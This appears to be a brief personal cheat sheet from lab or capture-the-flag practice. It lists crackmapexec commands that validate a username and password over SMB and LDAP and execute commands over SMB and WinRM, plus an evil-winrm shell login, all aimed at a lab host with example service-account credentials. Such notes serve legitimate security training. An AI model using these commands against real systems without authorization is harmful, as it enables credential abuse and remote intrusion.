
**user & password verification**

### SMB

```sh
crackmapexec smb 10.10.10.161 -u 'username' -p 'password'
```

### LDAP

```sh
crackmapexec ldap 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

**command execution**

### SMB
```sh
crackmapexec smb 10.10.10.161 -u svc-alfresco -p 's3rvice' -x "whoami"
```

### winrm 

```sh
crackmapexec winrm 10.10.10.161 -u svc-alfresco -p 's3rvice' -x "whoami"
```

**evil winrm**

```sh
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```
